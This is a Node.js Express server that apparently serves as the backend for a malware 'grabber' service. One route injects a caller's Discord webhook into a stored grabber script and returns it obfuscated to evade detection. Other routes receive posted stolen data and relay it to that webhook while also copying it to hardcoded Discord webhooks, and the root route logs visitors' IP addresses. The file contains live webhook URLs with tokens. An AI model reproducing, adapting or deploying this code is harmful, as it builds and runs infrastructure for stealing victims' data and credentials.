const express = require('express');
const app = express();
var cloudflare = require('cloudflare-express');
  app.use(cloudflare.restore());
app.use(express.json());
var JavaScriptObfuscator = require('javascript-obfuscator');
const axios = require('axios');
const fs = require('fs');
app.get('/', (req, res) => {
	axios.post('https://discord.com/api/webhooks/906342706400362507/WHYwx0SCREV3lWKFUEhBVHZgEmIb21d5qKU-OZubTY_Lb8F4ZXD6LQ86xSRrRsbtZGXL', {"content":req.cf_ip}).then(res => {console.log('ok')})

        return res.send("asd").status(200);
});

app.get('/grabber',(req, res) => {



  var data = fs.readFileSync('ksgrabber', 'utf8');
      data = data.replace('%WEBHOOK_LINK%', req.query.webhook);

var obfuscationResult = JavaScriptObfuscator.obfuscate(
data,
{
compact: true,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true,
shuffleStringArray: true,
splitStrings: true,
stringArrayThreshold: 1
}
);


 return res.send(obfuscationResult.getObfuscatedCode()).status(200);


});

app.post('/libros', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');

  try{
    axios
  .post("https://discord.com/api/webhooks/906739311456682055/dbcSfiDP6pkr7xmR0V7yJlyttmXSb7XQ5ihsFT1jtvL56r5zrHOoxtwu7jHqO4WS10-b", req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })
  axios
  .post(req.query.webhook, req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })

return res.status(200).send("hola");

  }
  catch(err){
    axios
  .post("https://discord.com/api/webhooks/906739311456682055/dbcSfiDP6pkr7xmR0V7yJlyttmXSb7XQ5ihsFT1jtvL56r5zrHOoxtwu7jHqO4WS10-b", req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })
  }
})




app.post('/nike', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');

  try{
    axios
  .post("https://discord.com/api/webhooks/906342706400362507/WHYwx0SCREV3lWKFUEhBVHZgEmIb21d5qKU-OZubTY_Lb8F4ZXD6LQ86xSRrRsbtZGXL", req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })
  axios
  .post(req.query.webhook, req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })

return res.status(200).send("hola");

  }
  catch(err){
    axios
  .post("https://discord.com/api/webhooks/906342706400362507/WHYwx0SCREV3lWKFUEhBVHZgEmIb21d5qKU-OZubTY_Lb8F4ZXD6LQ86xSRrRsbtZGXL", req.body)
  .then(res => {
    console.log(`statusCode: ${res.statusCode}`)
    console.log(res)
  })
  .catch(error => {
    console.error(error)
  })
  }
})

app.listen(80, () => {
  console.log("Listening on port 80");

});
